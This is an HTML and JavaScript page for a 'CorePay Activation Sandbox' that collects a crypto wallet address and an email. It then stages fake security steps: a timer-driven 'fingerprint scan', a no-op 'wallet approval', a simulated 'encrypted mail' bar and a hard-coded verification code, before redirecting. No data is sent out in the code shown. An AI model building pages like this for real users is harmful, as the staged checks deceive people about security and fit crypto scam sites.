<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>CorePay Activation Sandbox</title>
<style>
body{margin:0;background:#0b0f14;font-family:system-ui;color:white;opacity:0;transition:.3s}
.center{height:100vh;display:flex;justify-content:center;align-items:center}
.card{background:#111827;padding:40px;border-radius:18px;width:360px;text-align:center}
h2{margin-top:0;margin-bottom:10px}
input,select{width:100%;padding:14px;margin:10px 0;background:#0b0f14;border:1px solid #263041;border-radius:10px;color:white}
button{width:100%;padding:15px;margin-top:10px;border:none;border-radius:12px;background:#22c55e;color:white;font-weight:700;cursor:pointer;transition:.3s}
.logo{width:160px;margin-bottom:15px}
.pop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);justify-content:center;align-items:center}
.box{background:#111827;padding:30px;border-radius:16px;width:330px;text-align:center}
.scan{width:120px;height:120px;border-radius:50%;border:4px solid #22c55e;margin:20px auto;animation:scan 2s infinite linear}
@keyframes scan{100%{transform:rotate(360deg)}}
.bar{height:8px;background:#1f2937;border-radius:8px;margin-top:15px}
.fill{height:100%;width:0;background:#22c55e}
.loadingOverlay{display:none;position:fixed;inset:0;background:#0b0f14;justify-content:center;align-items:center;z-index:9999;color:white;text-align:center;font-size:22px;}
.loadingDots{display:inline-block;margin-left:5px;}
.loadingDots span{animation:dot 1.4s infinite linear;display:inline-block;}
.loadingDots span:nth-child(1){animation-delay:0s;}
.loadingDots span:nth-child(2){animation-delay:.2s;}
.loadingDots span:nth-child(3){animation-delay:.4s;}
@keyframes dot{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
</style>
</head>
<body>

<div class="center">
<div class="card">
<img src="logo.png" class="logo">
<h2>CorePay Activation Sandbox</h2>
<select id="net">
<option>TRX</option>
<option>BTC</option>
<option>ERC</option>
<option>BNB</option>
<option>SOL</option>
</select>
<input id="addr" placeholder="Wallet address">
<button onclick="finger()">Secure Login</button>
</div>
</div>

<!-- fingerprint pop -->
<div class="pop" id="fingerPop">
<div class="box">
<h3 id="scanTitle">Fingerprint Scan</h3>
<div class="scan"></div>
<p id="scanText">Scanning identity...</p>
</div>
</div>

<!-- approval pop -->
<div class="pop" id="approvePop">
<div class="box">
<h3>Wallet Approval</h3>
<p>Approve secure connection</p>
<button onclick="emailStep()">Approve</button>
</div>
</div>

<!-- email pop -->
<div class="pop" id="emailPop">
<div class="box">
<h3>Email Verification</h3>
<div id="email1">
<input id="email" placeholder="Email">
<button onclick="sendEmail()">Send Code</button>
</div>
<div id="emailBarBox" style="display:none">
<p id="emailStatus">Sending encrypted mailâ€¦</p>
<div class="bar"><div class="fill" id="emailBar"></div></div>
</div>
<div id="email2" style="display:none">
<input id="ecode" placeholder="Enter code">
<button onclick="verifyEmailCode()">Verify</button>
</div>
</div>
</div>

<!-- animated redirect overlay -->
<div class="loadingOverlay" id="loadingOverlay">
<h3>Loading CorePay Dashboard<span class="loadingDots"><span>.</span><span>.</span><span>.</span></span></h3>
</div>

<script>
document.addEventListener("DOMContentLoaded", ()=>{
function validWallet(net,val){
const rules={
TRX:/^T[1-9A-HJ-NP-Za-km-z]{33}$/,
BTC:/^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,39}$/,
ERC:/^0x[a-fA-F0-9]{40}$/,
BNB:/^0x[a-fA-F0-9]{40}$/,
SOL:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/
};
return rules[net].test(val);
}
window.finger = function(){
if(addr.value.length<5){alert("Enter wallet");return;}
fingerPop.style.display="flex";
scanTitle.innerText="Fingerprint Scan";
scanText.innerText="Scanning identity...";
let ok=validWallet(net.value,addr.value);
let delay= ok ? 10000 : 6000;
setTimeout(()=>{
scanTitle.innerText= ok ? "Verification Successful" : "Verification Failed";
scanText.innerText= ok ? "Wallet confirmed" : "Address format invalid";
setTimeout(()=>{
fingerPop.style.display="none";
if(ok){approvePop.style.display="flex";}
},2000);
},delay);
}
window.emailStep = function(){approvePop.style.display="none"; emailPop.style.display="flex";}
window.sendEmail = function(){
let mail=email.value.trim();
let valid=/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(mail);
email1.style.display="none"; emailBarBox.style.display="block";
let p=0;
let t=setInterval(()=>{
p+=4; emailBar.style.width=p+"%";
if(p>=100){clearInterval(t);
if(!valid){emailStatus.innerText="Mail error";setTimeout(()=>location="index.html",2000);}
else{emailBarBox.style.display="none"; email2.style.display="block";}
}
},70);
}
window.verifyEmailCode = function(){
let code=ecode.value.trim();
if(code.length!==20 || code!=="88287463991237827383"){
alert("Email verification failed"); location="index.html"; return;
}
localStorage.wallet=addr.value; localStorage.net=net.value;

// Show animated overlay
document.getElementById("loadingOverlay").style.display="flex";

// Redirect after 6 seconds
setTimeout(()=>{location.href="home.html";},6000);
}

setTimeout(()=>document.body.style.opacity=1,300);
});
</script>
</body>
</html>
